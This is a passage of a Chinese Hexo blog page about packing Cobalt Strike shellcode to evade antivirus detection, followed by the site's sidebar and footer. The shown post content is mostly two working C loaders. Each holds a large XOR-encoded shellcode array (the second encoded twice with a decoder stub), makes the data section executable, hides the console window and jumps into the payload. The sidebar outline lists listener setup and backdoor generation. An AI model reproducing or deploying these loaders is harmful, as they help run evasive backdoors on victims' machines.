class="line">&quot;\x8c\x99\x99\xca\xc9\xf1\xce\x10\x06\x5f\x66\x4c\x72\xe9\xc2\xa8&quot;</span><br><span class="line">&quot;\x4b\xcb\xf1\x99\x9b\xd9\x1d\xcb\xcb\xcb\xca\xcb\xc9\xf1\x72\xcc&quot;</span><br><span class="line">&quot;\xb7\xa2\x66\x4c\x10\x5f\x1a\x5a\xc9\xa8\x66\xce\xce\xf3\x66\xca&quot;</span><br><span class="line">&quot;\xcf\xf1\xb4\x9f\x81\xe2\x66\x4c\x1c\x59\x96\x1d\x5a\x98\x99\x99&quot;</span><br><span class="line">&quot;\xa8\x66\x1c\x6f\xed\x9d\x10\x60\x72\x90\xf1\x33\x5c\x7b\xc4\x66&quot;</span><br><span class="line">&quot;\x4c\x10\x58\xf1\xdc\xb8\xc7\xa8\x66\x4c\xa8\x66\xce\xf3\x9e\xc8&quot;</span><br><span class="line">&quot;\xcf\xc9\xf1\x2e\xce\x79\x92\x66\x4c\x26\x99\xb6\x99\x99\xa0\x5e&quot;</span><br><span class="line">&quot;\xed\x2e\xa8\x66\x70\x08\x98\x99\x99\x70\x50\x98\x99\x99\x71\x12&quot;</span><br><span class="line">&quot;\x66\x66\x66\xb6\xef\xd7\xce\xd8\x99\x3d\x1b\xaf\x70\xc4\xb6\x8e&quot;</span><br><span class="line">&quot;\xdf\x30\x31\x45\xb1\xe3\x4b\xa8\x37\xce\x64\x1a\xd2\xcf\x93\xf8&quot;</span><br><span class="line">&quot;\xb8\x3a\x25\x0c\xcf\x86\x16\x57\xa9\x21\xe9\x9b\xfb\xd5\x0b\x16&quot;</span><br><span class="line">&quot;\x01\xed\x57\xeb\x3c\x6a\x01\x32\x92\x52\x5a\x99\x85\xf7\x49\x9d&quot;</span><br><span class="line">&quot;\x65\xdd\x18\xb6\x99\x15\x59\xcf\xe3\x04\xde\x16\xa2\xbd\xcc\xf3&quot;</span><br><span class="line">&quot;\x22\xb9\x99\xcc\xea\xfc\xeb\xb4\xd8\xfe\xfc\xf7\xed\xa3\xb9\xd4&quot;</span><br><span class="line">&quot;\xf6\xe3\xf0\xf5\xf5\xf8\xb6\xad\xb7\xa9\xb9\xb1\xfa\xf6\xf4\xe9&quot;</span><br><span class="line">&quot;\xf8\xed\xf0\xfb\xf5\xfc\xa2\xb9\xd4\xca\xd0\xdc\xb9\xa1\xb7\xa9&quot;</span><br><span class="line">&quot;\xa2\xb9\xce\xf0\xf7\xfd\xf6\xee\xea\xb9\xd7\xcd\xb9\xaf\xb7\xa9&quot;</span><br><span class="line">&quot;\xa2\xb9\xcd\xeb\xf0\xfd\xfc\xf7\xed\xb6\xad\xb7\xa9\xb0\x94\x93&quot;</span><br><span class="line">&quot;\x99\x41\x4e\xc8\x5d\xff\x4a\x21\x8c\x57\x5f\x38\xe1\x36\xcc\xcb&quot;</span><br><span class="line">&quot;\x8a\x22\xd6\xb5\x4f\x7f\x99\xfe\x08\x8b\x41\xe6\x79\xe8\x12\xf4&quot;</span><br><span class="line">&quot;\x12\xda\xd4\x89\x59\x70\x0a\xff\x17\xa8\x7f\x20\xab\x19\xec\x85&quot;</span><br><span class="line">&quot;\x76\x53\xd3\x33\x0d\x8d\xa9\xb8\x91\xa3\x32\xa4\x5b\x78\x5d\xde&quot;</span><br><span class="line">&quot;\x8a\x81\x3a\x6c\x34\xc8\xf3\x31\x0a\x91\xd0\x01\x8f\xcd\x35\x18&quot;</span><br><span class="line">&quot;\x22\x27\x61\xe8\x7a\xf3\xb3\x6c\x3f\x1c\x60\x06\x45\xf0\xf5\xb9&quot;</span><br><span class="line">&quot;\x0a\x02\x43\x9e\xb1\x8c\x2b\x8d\xb5\x65\xcc\x21\x1e\xe2\xfd\x4f&quot;</span><br><span class="line">&quot;\x38\xd7\x36\xf3\xef\xb7\xed\xb7\x16\xfb\x43\x7c\x01\x39\x11\x7b&quot;</span><br><span class="line">&quot;\xf6\x29\x4b\x3c\xbc\x7c\xd3\x3f\xdd\x8f\x0b\x0d\x80\x18\xa2\xeb&quot;</span><br><span class="line">&quot;\x88\x47\x01\xfc\x37\x2c\xf1\x40\x55\xfc\x21\x1f\x94\xe1\x08\xe6&quot;</span><br><span class="line">&quot;\x60\x8d\x7c\x6a\x5f\xae\xec\xef\x61\x65\x1c\x30\x38\x39\xc3\x38&quot;</span><br><span class="line">&quot;\x8d\xa0\xce\xa9\x39\x75\xdd\x41\x87\x52\x51\x7b\x3e\xe8\xbd\x27&quot;</span><br><span class="line">&quot;\xa3\x81\x79\x28\xc4\xc8\xec\x97\x5d\xca\xbb\xf7\x53\xc8\xc8\xf8&quot;</span><br><span class="line">&quot;\xce\xc3\x84\xa1\xfc\x9a\x87\x3e\x55\xba\x56\x8d\x6a\x1c\xcb\x75&quot;</span><br><span class="line">&quot;\x19\x88\x99\xf1\x69\x2c\x3b\xcf\x66\x4c\xf3\xd9\xf1\x99\x89\x99&quot;</span><br><span class="line">&quot;\x99\xf1\x99\x99\xd9\x99\xce\xf1\xc1\x3d\xca\x7c\x66\x4c\x0a\x20&quot;</span><br><span class="line">&quot;\x99\x99\x99\x99\x98\x40\xc8\xca\x10\x7e\xce\xf1\x99\xb9\x99\x99&quot;</span><br><span class="line">&quot;\xca\xcf\xf1\x8b\x0f\x10\x7b\x66\x4c\x1c\x59\xed\x5f\x12\x9e\x98&quot;</span><br><span class="line">&quot;\x5a\x1c\x59\xec\x7c\xc1\x5a\x71\x30\x64\x66\x66\xa8\xa0\xab\xb7&quot;</span><br><span class="line">&quot;\xa8\xaf\xa1\xb7\xa8\xb7\xa8\xa8\xa1\x99\xf6\x33\xc8\x5a\x09&quot;;</span><br><span class="line"></span><br><span class="line">void run1()&#123;</span><br><span class="line">	((void(*)(void))&amp;shellcode)();</span><br><span class="line">&#125;</span><br><span class="line">void run2()&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		lea eax,shellcode</span><br><span class="line">		jmp eax</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">void run3()&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">	  mov eax,offset shellcode</span><br><span class="line">	  jmp eax</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">void run4()&#123;</span><br><span class="line">__asm</span><br><span class="line">	&#123;</span><br><span class="line">	  mov eax,offset shellcode</span><br><span class="line">	  _emit 0xFF</span><br><span class="line">	  _emit 0xE0</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	run2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编码两次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line">#include &quot;windows.h&quot;</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/section:.data,RWE&quot;)</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line">#pragma comment(linker,&quot;/INCREMENTAL:NO&quot;)</span><br><span class="line"></span><br><span class="line">char shellcode[]=&quot;\x83\xc0\x17\x33\xc9\x8a\x1c\x08\x80\xf3\x23\x80\xf3\x99\x88\x1c\x08\x41\x80\xfb\x90\x75\xee&quot;</span><br><span class="line">&quot;\x46\x52\x33\xba\xba\xba\xda\x33\x5f\x8b\x68\xde\x31\xe8\x8a\x31&quot;</span><br><span class="line">&quot;\xe8\xb6\x31\xe8\xae\x31\xc8\x92\xb5\x0d\xf0\x9c\x8b\x45\x8b\x7a&quot;</span><br><span class="line">&quot;\x16\x86\xdb\xc6\xb8\x96\x9a\x7b\x75\xb7\xbb\x7d\x58\x4a\xe8\xed&quot;</span><br><span class="line">&quot;\x31\xe8\xaa\x31\xf8\x86\xbb\x6a\x31\xfa\xc2\x3f\x7a\xce\xf0\xbb&quot;</span><br><span class="line">&quot;\x6a\xea\x31\xf2\xa2\x31\xe2\x9a\xbb\x69\x59\x86\xf3\x31\x8e\x31&quot;</span><br><span class="line">&quot;\xbb\x6c\x8b\x45\x8b\x7a\x16\x7b\x75\xb7\xbb\x7d\x82\x5a\xcf\x4e&quot;</span><br><span class="line">&quot;\xb9\xc7\x42\x81\xc7\x9e\xcf\x58\xe2\x31\xe2\x9e\xbb\x69\xdc\x31&quot;</span><br><span class="line">&quot;\xb6\xf1\x31\xe2\xa6\xbb\x69\x31\xbe\x31\xbb\x6a\x33\xfe\x9e\x9e&quot;</span><br><span class="line">&quot;\xe1\xe1\xdb\xe3\xe0\xeb\x45\x5a\xe2\xe5\xe0\x31\xa8\x51\x3c\xe7&quot;</span><br><span class="line">&quot;\xd2\xd4\xdf\xce\xba\xd2\xcd\xd3\xd4\xd3\xee\xd2\xf6\xcd\x9c\xbd&quot;</span><br><span class="line">&quot;\x45\x6f\x8b\x45\xed\xed\xed\xed\xed\xd2\x80\xec\xc3\x1d\x45\x6f&quot;</span><br><span class="line">&quot;\x53\x3e\xba\xba\xba\xe1\x8b\x73\xeb\xeb\xd0\xb9\xeb\xeb\xd2\x09&quot;</span><br><span class="line">&quot;\xaf\xba\xba\xe9\xea\xd2\xed\x33\x25\x7c\x45\x6f\x51\xca\xe1\x8b&quot;</span><br><span class="line">&quot;\x68\xe8\xd2\xba\xb8\xfa\x3e\xe8\xe8\xe8\xe9\xe8\xea\xd2\x51\xef&quot;</span><br><span class="line">&quot;\x94\x81\x45\x6f\x33\x7c\x39\x79\xea\x8b\x45\xed\xed\xd0\x45\xe9&quot;</span><br><span class="line">&quot;\xec\xd2\x97\xbc\xa2\xc1\x45\x6f\x3f\x7a\xb5\x3e\x79\xbb\xba\xba&quot;</span><br><span class="line">&quot;\x8b\x45\x3f\x4c\xce\xbe\x33\x43\x51\xb3\xd2\x10\x7f\x58\xe7\x45&quot;</span><br><span class="line">&quot;\x6f\x33\x7b\xd2\xff\x9b\xe4\x8b\x45\x6f\x8b\x45\xed\xd0\xbd\xeb&quot;</span><br><span class="line">&quot;\xec\xea\xd2\x0d\xed\x5a\xb1\x45\x6f\x05\xba\x95\xba\xba\x83\x7d&quot;</span><br><span class="line">&quot;\xce\x0d\x8b\x45\x53\x2b\xbb\xba\xba\x53\x73\xbb\xba\xba\x52\x31&quot;</span><br><span class="line">&quot;\x45\x45\x45\x95\xcc\xf4\xed\xfb\xba\x1e\x38\x8c\x53\xe7\x95\xad&quot;</span><br><span class="line">&quot;\xfc\x13\x12\x66\x92\xc0\x68\x8b\x14\xed\x47\x39\xf1\xec\xb0\xdb&quot;</span><br><span class="line">&quot;\x9b\x19\x06\x2f\xec\xa5\x35\x74\x8a\x02\xca\xb8\xd8\xf6\x28\x35&quot;</span><br><span class="line">&quot;\x22\xce\x74\xc8\x1f\x49\x22\x11\xb1\x71\x79\xba\xa6\xd4\x6a\xbe&quot;</span><br><span class="line">&quot;\x46\xfe\x3b\x95\xba\x36\x7a\xec\xc0\x27\xfd\x35\x81\x9e\xef\xd0&quot;</span><br><span class="line">&quot;\x01\x9a\xba\xef\xc9\xdf\xc8\x97\xfb\xdd\xdf\xd4\xce\x80\x9a\xf7&quot;</span><br><span class="line">&quot;\xd5\xc0\xd3\xd6\xd6\xdb\x95\x8e\x94\x8a\x9a\x92\xd9\xd5\xd7\xca&quot;</span><br><span class="line">&quot;\xdb\xce\xd3\xd8\xd6\xdf\x81\x9a\xf7\xe9\xf3\xff\x9a\x82\x94\x8a&quot;</span><br><span class="line">&quot;\x81\x9a\xed\xd3\xd4\xde\xd5\xcd\xc9\x9a\xf4\xee\x9a\x8c\x94\x8a&quot;</span><br><span class="line">&quot;\x81\x9a\xee\xc8\xd3\xde\xdf\xd4\xce\x95\x8e\x94\x8a\x93\xb7\xb0&quot;</span><br><span class="line">&quot;\xba\x62\x6d\xeb\x7e\xdc\x69\x02\xaf\x74\x7c\x1b\xc2\x15\xef\xe8&quot;</span><br><span class="line">&quot;\xa9\x01\xf5\x96\x6c\x5c\xba\xdd\x2b\xa8\x62\xc5\x5a\xcb\x31\xd7&quot;</span><br><span class="line">&quot;\x31\xf9\xf7\xaa\x7a\x53\x29\xdc\x34\x8b\x5c\x03\x88\x3a\xcf\xa6&quot;</span><br><span class="line">&quot;\x55\x70\xf0\x10\x2e\xae\x8a\x9b\xb2\x80\x11\x87\x78\x5b\x7e\xfd&quot;</span><br><span class="line">&quot;\xa9\xa2\x19\x4f\x17\xeb\xd0\x12\x29\xb2\xf3\x22\xac\xee\x16\x3b&quot;</span><br><span class="line">&quot;\x01\x04\x42\xcb\x59\xd0\x90\x4f\x1c\x3f\x43\x25\x66\xd3\xd6\x9a&quot;</span><br><span class="line">&quot;\x29\x21\x60\xbd\x92\xaf\x08\xae\x96\x46\xef\x02\x3d\xc1\xde\x6c&quot;</span><br><span class="line">&quot;\x1b\xf4\x15\xd0\xcc\x94\xce\x94\x35\xd8\x60\x5f\x22\x1a\x32\x58&quot;</span><br><span class="line">&quot;\xd5\x0a\x68\x1f\x9f\x5f\xf0\x1c\xfe\xac\x28\x2e\xa3\x3b\x81\xc8&quot;</span><br><span class="line">&quot;\xab\x64\x22\xdf\x14\x0f\xd2\x63\x76\xdf\x02\x3c\xb7\xc2\x2b\xc5&quot;</span><br><span class="line">&quot;\x43\xae\x5f\x49\x7c\x8d\xcf\xcc\x42\x46\x3f\x13\x1b\x1a\xe0\x1b&quot;</span><br><span class="line">&quot;\xae\x83\xed\x8a\x1a\x56\xfe\x62\xa4\x71\x72\x58\x1d\xcb\x9e\x04&quot;</span><br><span class="line">&quot;\x80\xa2\x5a\x0b\xe7\xeb\xcf\xb4\x7e\xe9\x98\xd4\x70\xeb\xeb\xdb&quot;</span><br><span class="line">&quot;\xed\xe0\xa7\x82\xdf\xb9\xa4\x1d\x76\x99\x75\xae\x49\x3f\xe8\x56&quot;</span><br><span class="line">&quot;\x3a\xab\xba\xd2\x4a\x0f\x18\xec\x45\x6f\xd0\xfa\xd2\xba\xaa\xba&quot;</span><br><span class="line">&quot;\xba\xd2\xba\xba\xfa\xba\xed\xd2\xe2\x1e\xe9\x5f\x45\x6f\x29\x03&quot;</span><br><span class="line">&quot;\xba\xba\xba\xba\xbb\x63\xeb\xe9\x33\x5d\xed\xd2\xba\x9a\xba\xba&quot;</span><br><span class="line">&quot;\xe9\xec\xd2\xa8\x2c\x33\x58\x45\x6f\x3f\x7a\xce\x7c\x31\xbd\xbb&quot;</span><br><span class="line">&quot;\x79\x3f\x7a\xcf\x5f\xe2\x79\x52\x13\x47\x45\x45\x8b\x83\x88\x94&quot;</span><br><span class="line">&quot;\x8b\x8c\x82\x94\x8b\x94\x8b\x8b\x82\xba\xd5\x10\xeb\x79\x2a&quot;;</span><br><span class="line"></span><br><span class="line">void run1()&#123;</span><br><span class="line">	((void(*)(void))&amp;shellcode)();</span><br><span class="line">&#125;</span><br><span class="line">void run2()&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		lea eax,shellcode</span><br><span class="line">		jmp eax</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">void run3()&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">	  mov eax,offset shellcode</span><br><span class="line">	  jmp eax</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">void run4()&#123;</span><br><span class="line">__asm</span><br><span class="line">	&#123;</span><br><span class="line">	  mov eax,offset shellcode</span><br><span class="line">	  _emit 0xFF</span><br><span class="line">	  _emit 0xE0</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	run2();</span><br><span class="line">	/*__asm&#123;</span><br><span class="line">	lea eax,shellcode</span><br><span class="line">	push eax</span><br><span class="line">	push eax</span><br><span class="line">	retn</span><br><span class="line">	&#125;*/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/C语言/" rel="tag"># C语言</a>
+          
+            <a href="/tags/汇编语言/" rel="tag"># 汇编语言</a>
+          
+            <a href="/tags/逆向/" rel="tag"># 逆向</a>
+          
+            <a href="/tags/shellcode/" rel="tag"># shellcode</a>
+          
+            <a href="/tags/免杀/" rel="tag"># 免杀</a>
+          
+            <a href="/tags/cobalt-strike/" rel="tag"># cobalt strike</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/25/几种加载shellcode的方法/" rel="next" title="几种加载shellcode的方法">
+                <i class="fa fa-chevron-left"></i> 几种加载shellcode的方法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/29/红队工具Octopus/" rel="prev" title="红队工具Octopus">
+                红队工具Octopus <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/zql.jpg" alt="尘林">
+            
+              <p class="site-author-name" itemprop="name">尘林</p>
+              <p class="site-description motion-element" itemprop="description">势，只会裹挟随波逐流之人。一心既定，便不问大势所趋。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Cobalt-Strike启动"><span class="nav-number">1.</span> <span class="nav-text">Cobalt Strike启动</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#设置监听"><span class="nav-number">1.1.</span> <span class="nav-text">设置监听</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#生成后门"><span class="nav-number">1.2.</span> <span class="nav-text">生成后门</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编译运行"><span class="nav-number">2.</span> <span class="nav-text">编译运行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#装饰shellcode"><span class="nav-number">3.</span> <span class="nav-text">装饰shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#异或编码"><span class="nav-number">3.1.</span> <span class="nav-text">异或编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解码"><span class="nav-number">3.2.</span> <span class="nav-text">解码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#装饰完毕"><span class="nav-number">3.3.</span> <span class="nav-text">装饰完毕</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">尘林</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
